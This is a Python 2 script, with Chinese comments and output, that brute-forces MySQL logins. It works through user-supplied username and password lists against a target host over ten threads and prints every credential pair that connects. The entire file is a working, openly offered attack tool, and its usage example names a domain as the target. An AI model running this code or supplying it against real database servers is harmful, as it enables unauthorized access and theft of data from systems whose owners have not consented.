# -*- coding: utf-8 -*-

import os, sys, re, socket, time
from functools import partial
from multiprocessing.dummy import Pool as ThreadPool

try:
    import MySQLdb
except ImportError:
    print '\n[!] MySQLdb模块导入错误,请到下面网址下载：'
    print '[!] http://www.codegood.com/archives/129'
    exit()


def usage():
    print '+' + '-' * 90 + '+'
    print '\t\t\t   Python MySQL暴力破解工具多线程版'
    print '\t\t\t  Blog：http://github.com/wooyunwang/'
    print '\t\t\t\t   Code BY： Jason'
    print '\t\t\t\t   Time：2019-11-11'
    print '+' + '-' * 90 + '+'
    if len(sys.argv) != 6:
        print "用法: " + os.path.basename(sys.argv[0]) + " 待破解的ip/domain 端口 数据库 用户名列表 密码列表"
        print "实例: " + os.path.basename(sys.argv[0]) + "   www.minsv.com   3306  mysql  user.txt  pass.txt"
        sys.exit()


def mysql_brute(user, password):
    "mysql数据库破解函数"
    db = None
    try:
        # print "user:", user, "password:", password
        db = MySQLdb.connect(host=host, user=user, passwd=password, db=sys.argv[3], port=int(sys.argv[2]))
        # print '[+] 破解成功：', user, password
        result.append('用户名：' + user + "\t密码：" + password)
    except KeyboardInterrupt:
        print '按您的吩咐,已成功退出程序!'
        exit()
    except MySQLdb.Error, msg:
        # print '未知错误:', msg
        pass
    finally:
        if db:
            db.close()


if __name__ == '__main__':
    usage()
    start_time = time.time()
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
        host = sys.argv[1]
    else:
        host = socket.gethostbyname(sys.argv[1])
    userlist = [i.rstrip() for i in open(sys.argv[4])]
    passlist = [j.rstrip() for j in open(sys.argv[5])]
    print '\n[+] 目  标：%s \n' % sys.argv[1]
    print '[+] 用户名：%d 条\n' % len(userlist)
    print '[+] 密  码：%d 条\n' % len(passlist)
    print '[!] 密码破解中,请稍候……\n'
    result = []

    for user in userlist:
        partial_user = partial(mysql_brute, user)
        pool = ThreadPool(10)
        pool.map(partial_user, passlist)
        pool.close()
        pool.join()
    if len(result) != 0:
        print '[+] 恭喜,MySQL密码破解成功!\n'
        for x in {}.fromkeys(result).keys():
            print x + '\n'
    else:
        print '[-] 杯具了,MySQL密码破解失败!\n'
    print '[+] 破解完成，用时： %d 秒' % (time.time() - start_time)
